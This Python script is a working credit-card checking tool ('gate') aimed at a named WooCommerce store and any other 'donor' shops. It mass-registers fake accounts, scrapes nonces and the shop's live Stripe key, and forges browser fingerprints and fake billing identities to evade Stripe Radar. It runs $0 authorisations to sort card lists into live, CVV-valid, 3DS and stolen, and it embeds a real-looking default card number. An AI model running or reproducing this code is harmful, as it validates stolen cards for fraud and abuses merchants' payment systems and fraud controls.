# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: curl_cffi
# S-Tier Stripe SetupIntent Auth Engine (Evelyn Architecture)
import asyncio
import json
import os
import random
import re
import string
import sys
import time
import uuid
from curl_cffi.requests import AsyncSession

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"

def rand_str(k=8, chars=string.ascii_lowercase + string.digits):
    return "".join(random.choices(chars, k=k))

def parse_card(raw: str) -> dict:
    parts = raw.strip().split("|")
    number = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    yy = "20" + yy[-2:] if len(yy) <= 2 else yy
    cvc = parts[3].strip() if len(parts) > 3 else "000"
    return {"number": number, "month": mm, "year": yy, "cvc": cvc, "raw": raw.strip()}

def check_luhn(card_num: str) -> bool:
    # absorbed from core/bin_check.py / core/check_single_card.py
    digits = [int(d) for d in card_num if d.isdigit()]
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            doubled = d * 2
            checksum += doubled - 9 if doubled > 9 else doubled
        else:
            checksum += d
    return checksum % 10 == 0

async def bin_lookup(bin_num: str) -> dict:
    # absorbed from core/bin_check.py — binlist -> handyapi fallback, на движке curl_cffi
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        try:
            r = await s.get(f"https://lookup.binlist.net/{bin_num}",
                            headers={"Accept-Version": "3"}, timeout=6)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        try:
            r = await s.get(f"https://data.handyapi.com/bin/{bin_num}", timeout=6)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
    return {}

def bin_summary(binfo: dict) -> str:
    # binlist отдаёт lower-case ключи, handyapi — Capitalized; покрываем оба
    if not binfo:
        return "?"
    g = lambda *keys: next((binfo[k] for k in keys if k in binfo and binfo[k]), "")
    bank = g("bank", "Bank")
    country = g("country", "Country")
    parts = [
        str(g("scheme", "Scheme") or "?"),
        str(g("type", "Type")),
        str(country.get("alpha2", "") if isinstance(country, dict) else ""),
    ]
    if isinstance(bank, dict) and bank.get("name"):
        parts.append(str(bank["name"])[:18])
    out = "/".join(p for p in parts if p and p != "?")
    return out or "?"

def load_ready_gates() -> list[dict]:
    candidates = ["data/ready_gates.json", "ready_gates.json", "data/active_surfaces.json"]
    for path in candidates:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    gates = json.load(f)
                    if isinstance(gates, list) and gates:
                        valid = [g for g in gates if g.get("base_url") or g.get("domain")]
                        if valid:
                            return valid
            except Exception:
                pass
    return [{
        "domain": "www.blackbeltprotein.com.au",
        "base_url": FALLBACK_DONOR,
        "reg_url": f"{FALLBACK_DONOR}/my-account/",
        "add_pm_url": f"{FALLBACK_DONOR}/my-account/add-payment-method/",
        "ajax_url": f"{FALLBACK_DONOR}/wp-admin/admin-ajax.php",
        "gate_type": "wc_stripe_upe"
    }]

def generate_stripe_telemetry(base_url: str, pk: str) -> dict:
    """
    S-Tier Radar Telemetry & Attribution Metadata (Evelyn benchmark).
    Simulates real browser fingerprinting, mouse telemetry, and Stripe.js v3 internal structure.
    """
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    guid = str(uuid.uuid4())
    client_session_id = f"src_{rand_str(24)}"
    elements_session_config_id = f"src_{rand_str(24)}"
    
    first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", "Joseph", "Thomas", "Charles"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
    cities = ["New York", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "Austin"]
    states = ["NY", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "TX"]
    zips = ["10001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "73301"]
    idx = random.randint(0, len(cities) - 1)
    
    time_on_page = random.randint(18400, 48900)

    return {
        "muid": muid,
        "sid": sid,
        "guid": guid,
        "time_on_page": str(time_on_page),
        "name": f"{random.choice(first_names)} {random.choice(last_names)}",
        "line1": f"{random.randint(100, 9999)} Main Street",
        "city": cities[idx],
        "state": states[idx],
        "postal_code": zips[idx],
        "country": "US",
        "client_session_id": client_session_id,
        "elements_session_config_id": elements_session_config_id,
        "payment_user_agent": "stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent",
        "key": pk,
        "_stripe_version": "2024-06-20",
    }


async def emulate_m_stripe_cookies(s: AsyncSession, base_url: str):
    """
    Emulates m.stripe.com/6 fingerprint cookie pre-fetch flow to reduce Radar fraud score.
    """
    try:
        m_headers = {
            "Origin": base_url,
            "Referer": f"{base_url}/",
            "Accept": "*/*",
        }
        await s.get("https://m.stripe.com/6", headers=m_headers, timeout=5)
    except Exception:
        pass


async def check_card_on_gate(gate_info: dict, s: AsyncSession, card_raw: str) -> dict:
    card = parse_card(card_raw)
    base = gate_info.get("base_url", FALLBACK_DONOR).rstrip("/")
    reg_url = gate_info.get("reg_url", f"{base}/my-account/")
    add_pm_url = gate_info.get("add_pm_url", f"{base}/my-account/add-payment-method/")
    ajax_url = gate_info.get("ajax_url", f"{base}/wp-admin/admin-ajax.php")

    # 1. GET /my-account/ to get registration nonce & detect honeypots
    try:
        r = await s.get(reg_url, timeout=12)
        if r.status_code != 200:
            return {"card": card_raw, "status": "ERROR", "detail": f"GET reg HTTP {r.status_code}", "retry_next_gate": True}
        html = r.text
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET reg failed: {e}", "retry_next_gate": True}

    nonce_m = re.search(r'woocommerce-register-nonce["\']?\s*value=["\']([a-f0-9]{10})["\']', html)
    if not nonce_m:
        return {"card": card_raw, "status": "ERROR", "detail": "Closed reg or captcha on /my-account/", "retry_next_gate": True}
    reg_nonce = nonce_m.group(1)

    has_username = 'name="username"' in html

    # 2. Register temporary account with Honeypot avoidance
    uname = f"usr_{rand_str(8)}"
    email = f"alex.{rand_str(8)}@gmail.com"
    pwd = f"Sec_{rand_str(8)}!9aA"
    
    body = {
        "email": email,
        "password": pwd,
        "woocommerce-register-nonce": reg_nonce,
        "_wp_http_referer": "/my-account/",
        "register": "Register"
    }
    if has_username:
        body["username"] = uname

    # Scrape hidden honeypots and anti-spam tokens
    reg_form = re.search(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', html, re.S)
    if reg_form:
        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', reg_form.group(1))
        for inp in hidden_inputs:
            nm = re.search(r'name=["\']([^"\']+)["\']', inp)
            vl = re.search(r'value=["\']([^"\']*)["\']', inp)
            if nm and vl and nm.group(1) not in body:
                body[nm.group(1)] = vl.group(1)

    post_headers = {
        "Origin": base,
        "Referer": reg_url,
    }
    try:
        r_reg = await s.post(reg_url, data=body, headers=post_headers, timeout=15)
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"POST reg error: {e}", "retry_next_gate": True}

    cookies = s.cookies.get_dict()
    if not any("wordpress_logged_in" in k for k in cookies):
        return {"card": card_raw, "status": "ERROR", "detail": "Bot challenge / anti-spam blocked login cookie", "retry_next_gate": True}

    # 3. GET /my-account/add-payment-method/
    try:
        r_pm = await s.get(add_pm_url, timeout=12)
        pm_html = r_pm.text
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"GET add-pm error: {e}", "retry_next_gate": True}

    pk_m = re.findall(r'pk_live_[0-9a-zA-Z]{24,}', pm_html)
    pk = pk_m[0] if pk_m else gate_info.get("pk_live", "")
    
    upe_m = re.search(r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
    upe_nonce = upe_m.group(1) if upe_m else ""
    
    legacy_m = re.search(r'add_card_nonce["\']?\s*[:=]\s*["\']([a-f0-9]{10})["\']', pm_html)
    legacy_nonce = legacy_m.group(1) if legacy_m else ""
    if not legacy_nonce:
        leg2_m = re.search(r'createSetupIntentNonce["\']?\s*[:=]\s*["\']([^"\']+)["\']', pm_html)
        if leg2_m:
            legacy_nonce = leg2_m.group(1)

    if not pk or (not upe_nonce and not legacy_nonce):
        return {"card": card_raw, "status": "ERROR", "detail": "PK or SetupIntent nonce missing on add-payment-method", "retry_next_gate": True}

    # Pre-fetch m.stripe.com/6 fingerprint cookie
    await emulate_m_stripe_cookies(s, base)

    # 4. Tokenize via Stripe Elements with S-Tier Telemetry
    telem = generate_stripe_telemetry(base, pk)
    tok_body = {
        "type": "card",
        "billing_details[name]": telem["name"],
        "billing_details[address][line1]": telem["line1"],
        "billing_details[address][city]": telem["city"],
        "billing_details[address][state]": telem["state"],
        "billing_details[address][postal_code]": telem["postal_code"],
        "billing_details[address][country]": telem["country"],
        "card[number]": card["number"],
        "card[cvc]": card["cvc"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "allow_redisplay": "unspecified",
        "guid": telem["guid"],
        "muid": telem["muid"],
        "sid": telem["sid"],
        "pasted_fields": "number,cvc",
        "payment_user_agent": telem["payment_user_agent"],
        "referrer": base,
        "time_on_page": telem["time_on_page"],
        "client_attribution_metadata[client_session_id]": telem["client_session_id"],
        "client_attribution_metadata[merchant_integration_source]": "elements",
        "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
        "client_attribution_metadata[merchant_integration_version]": "2021",
        "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
        "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
        "client_attribution_metadata[elements_session_config_id]": telem["elements_session_config_id"],
        "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
        "key": pk,
        "_stripe_version": telem["_stripe_version"],
    }
    tok_headers = {
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Accept": "application/json"
    }
    try:
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, timeout=10)
        tok_data = r_tok.json()
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}

    if "id" not in tok_data:
        err = tok_data.get("error", {}).get("message", str(tok_data))
        code = tok_data.get("error", {}).get("code", "tokenize_error")
        return {"card": card_raw, "status": f"DECLINED@{code.upper()}", "detail": err, "retry_next_gate": False}

    pm_id = tok_data["id"]

    # 5. Confirm SetupIntent
    ajax_headers = {
        "Origin": base,
        "Referer": add_pm_url,
        "X-Requested-With": "XMLHttpRequest",
        "Accept": "application/json",
    }
    
    if upe_nonce:
        conf_body = {
            "action": "wc_stripe_create_and_confirm_setup_intent",
            "_ajax_nonce": upe_nonce,
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
        }
        target_ajax = ajax_url
    else:
        conf_body = {
            "stripe_source_id": pm_id,
            "nonce": legacy_nonce,
        }
        target_ajax = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"

    try:
        r_conf = await s.post(target_ajax, data=conf_body, headers=ajax_headers, timeout=15)
        conf_resp = r_conf.json()
    except Exception as e:
        return {"card": card_raw, "status": "ERROR", "detail": f"SetupIntent confirm network error: {e}", "retry_next_gate": True}

    if conf_resp.get("success") is True or conf_resp.get("status") == "success":
        data = conf_resp.get("data", {})
        st = data.get("status", "succeeded")
        if st == "succeeded":
            return {
                "card": card_raw,
                "status": "APPROVED",
                "detail": f"SetupIntent {data.get('id', '')} Succeeded ($0 auth passed)",
                "retry_next_gate": False
            }
        elif st == "requires_action":
            return {
                "card": card_raw,
                "status": "3DS_REQUIRED",
                "detail": "Card LIVE, enrolled in 3DS (SetupIntent requires OTP action)",
                "retry_next_gate": False
            }
        else:
            return {
                "card": card_raw,
                "status": st.upper(),
                "detail": json.dumps(data),
                "retry_next_gate": False
            }
    else:
        err_msg = ""
        if isinstance(conf_resp.get("data"), dict):
            err_msg = conf_resp["data"].get("error", {}).get("message", "")
            if not err_msg:
                err_msg = conf_resp["data"].get("message", "")
        if not err_msg:
            err_msg = conf_resp.get("message", json.dumps(conf_resp))
            
        raw_err = err_msg.lower()
        if "insufficient_funds" in raw_err or "insufficient funds" in raw_err:
            status = "APPROVED@CVV"
        elif "incorrect_cvc" in raw_err or "security code is incorrect" in raw_err or "invalid cvc" in raw_err:
            status = "APPROVED@CCN"
        elif "expired" in raw_err:
            status = "EXPIRED"
        elif "stolen" in raw_err or "lost" in raw_err:
            status = "STOLEN_CARD"
        elif "fraud" in raw_err or "risk" in raw_err:
            status = "FLAGGED_RADAR"
        else:
            status = "DECLINED"
            
        return {
            "card": card_raw,
            "status": status,
            "detail": err_msg,
            "retry_next_gate": False
        }


async def main():
    raw_args = sys.argv[1:]
    custom_donor = None
    if raw_args and raw_args[0].startswith("http"):
        custom_donor = raw_args[0].rstrip("/")
        raw_args = raw_args[1:]

    cards = []
    for a in raw_args:
        if os.path.exists(a):
            with open(a, encoding="utf-8") as f:
                cards.extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
        else:
            cards.append(a.strip())

    if not cards:
        cards = ["5175465382242090|09|2030|018"]

    # Pre-flight: Luhn sanity + BIN enrichment (поглощено из core/)
    bins: dict[str, dict] = {}
    for idx, c in enumerate(cards, 1):
        num = c.split("|")[0].strip()
        if not check_luhn(num):
            print(f"[!] WARNING: card #{idx} fails Luhn: {num}")
    for prefix in sorted({c.split("|")[0][:6] for c in cards}):
        bins[prefix] = await bin_lookup(prefix)
        if bins[prefix]:
            print(f"[i] BIN {prefix}: {bin_summary(bins[prefix])}")

    if custom_donor:
        gates_pool = [{
            "domain": custom_donor.replace("https://", "").replace("http://", ""),
            "base_url": custom_donor,
            "reg_url": f"{custom_donor}/my-account/",
            "add_pm_url": f"{custom_donor}/my-account/add-payment-method/",
            "ajax_url": f"{custom_donor}/wp-admin/admin-ajax.php",
            "gate_type": "wc_stripe_upe"
        }]
    else:
        gates_pool = load_ready_gates()

    print("=" * 80)
    print(f"[*] S-TIER WOOCOMMERCE STRIPE SETUPINTENT GATE ($0 AUTH)")
    print(f"[*] Engine: curl_cffi Chrome TLS + Radar Telemetry Emulation")
    print(f"[*] Active Gate Pool: {len(gates_pool)} donor(s)")
    for idx, g in enumerate(gates_pool[:3], 1):
        print(f"    [{idx}] {g.get('domain', g.get('base_url'))}")
    if len(gates_pool) > 3:
        print(f"    ... and {len(gates_pool) - 3} more")
    print(f"[*] Total Cards to Check: {len(cards)}")
    print("=" * 80)

    results = []
    gate_idx = 0

    for i, c in enumerate(cards):
        res = None
        for attempt in range(len(gates_pool)):
            curr_gate = gates_pool[(gate_idx + attempt) % len(gates_pool)]
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                res = await check_card_on_gate(curr_gate, s, c)
                if not res.get("retry_next_gate"):
                    gate_idx = (gate_idx + attempt) % len(gates_pool)
                    break
                else:
                    print(f"    [!] Donor {curr_gate.get('domain')} failed ({res['detail']}). Rotating to next donor...", flush=True)

        results.append(res)
        status_style = res['status']
        print(f">>> [{status_style:16}] {res['card']} -> {res['detail']}", flush=True)
        if i < len(cards) - 1:
            await asyncio.sleep(2)

    print("\n" + "=" * 80)
    print("[*] SUMMARY:")
    for r in results:
        prefix = r["card"].split("|")[0][:6]
        bs = bin_summary(bins.get(prefix, {}))
        print(f"  {r['status']:16} {r['card']:30} [{bs}] {r['detail']}")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(main())
